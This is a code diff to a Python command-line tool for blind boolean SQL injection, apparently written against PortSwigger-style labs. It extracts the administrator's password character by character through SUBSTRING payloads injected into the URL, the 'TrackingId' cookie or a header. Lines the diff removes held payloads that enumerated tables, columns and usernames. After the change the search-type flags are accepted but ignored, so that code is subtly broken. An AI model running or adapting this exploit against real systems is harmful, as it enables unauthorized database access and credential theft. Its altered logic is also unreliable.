@@ -34,27 +34,32 @@ def load_config(file_path):
         print(Fore.RED + f"Failed to load configuration: {e}" + Style.RESET_ALL)
         sys.exit(1)
 
-def test_char_at_position(url, cookies, headers, position, char, success_condition, verbose=False, search_type="password", offset=0):
-    """Test if a specific character at a specific position matches the target."""
-    if search_type == "column":
-        payload = f"'AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET {offset}), {position}, 1) = '{char}"
-    elif search_type == "table":
-        payload = f"'AND SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {offset}), {position}, 1) = '{char}"
-    elif search_type == "username":
-        payload = f"'AND SUBSTRING((SELECT username FROM users LIMIT 1 OFFSET {offset}), {position}, 1) = '{char}"
-    else:  # Default to password search
-        payload = f"'AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {position}, 1) = '{char}"
-    
-    cookies["TrackingId"] += payload
-    response = requests.get(url, headers=headers, cookies=cookies)
+def test_char_at_position(url, cookies, headers, position, char, success_condition, verbose=False, search_type="password", offset=0, inject_target="url"):
+    """Test if a specific character at a specific position matches the target based on the inject target."""
+    payload = f"'AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {position}, 1) = '{char}"
+
+    # Inject payload based on the specified target
+    if inject_target == "url":
+        target_url = url + payload
+        response = requests.get(target_url, headers=headers, cookies=cookies)
+    elif inject_target == "cookies":
+        cookies = cookies.copy()
+        cookies["TrackingId"] += payload
+        response = requests.get(url, headers=headers, cookies=cookies)
+    elif inject_target == "headers":
+        headers = headers.copy()
+        headers["Custom-Header"] = payload  # Replace 'Custom-Header' with your desired header name
+        response = requests.get(url, headers=headers, cookies=cookies)
+    else:
+        raise ValueError("Invalid inject target specified. Choose from 'url', 'cookies', or 'headers'.")
 
     if verbose and not interrupted:
         print(Fore.YELLOW + f"Testing position {position} with character '{char}'... Response length: {len(response.text)}" + Style.RESET_ALL)
 
     return success_condition in response.text
 
-def extract_data(config, charset, length, verbose, delay, output_file, success_condition, max_threads, proxy, search_type):
-    """Extract data character by character using the specified search type."""
+def extract_data(config, charset, length, verbose, delay, output_file, success_condition, max_threads, proxy, search_type, inject_target):
+    """Extract data character by character using the specified search type and injection target."""
     url = config["url"]
     cookies = config["cookies"]
     headers = config["headers"]
@@ -76,11 +81,10 @@ def extract_data(config, charset, length, verbose, delay, output_file, success_c
                 return None  # Exit if interrupted
 
             for char in charset:
-                if test_char_at_position(url, cookies.copy(), headers, position, char, success_condition, verbose, search_type, offset):
+                if test_char_at_position(url, cookies.copy(), headers, position, char, success_condition, verbose, search_type, offset, inject_target):
                     extracted_item += char
                     consecutive_timeouts = 0  # Reset consecutive timeouts after finding a character
                     if not interrupted:
-                        # Display character and progressively build the extracted item
                         print(Fore.GREEN + f"[+] Character found: {char} -> {extracted_item}" + Style.RESET_ALL)
                     return char
                 if delay > 0 and not interrupted:
@@ -148,10 +152,11 @@ def main():
     parser.add_argument('-t', '--threads', type=int, default=1, help="Number of concurrent threads to use (default: 1).")
     parser.add_argument('-p', '--proxy', type=str, help="Proxy URL (optional).")
 
-    # New flags to specify the type of search
+    # New flags for type of search and injection target
     parser.add_argument('-T', '--table', action='store_true', help="Search for table names.")
     parser.add_argument('-C', '--column', action='store_true', help="Search for column names.")
     parser.add_argument('-U', '--username', action='store_true', help="Search for usernames.")
+    parser.add_argument('--inject-target', type=str, default="url", choices=["url", "cookies", "headers"], help="Specify the injection target (default: 'url').")
 
     args = parser.parse_args()
 
@@ -178,7 +183,8 @@ def main():
         success_condition=args.success_condition,
         max_threads=args.threads,
         proxy=args.proxy,
-        search_type=search_type
+        search_type=search_type,
+        inject_target=args.inject_target
     )
 
 if __name__ == "__main__":
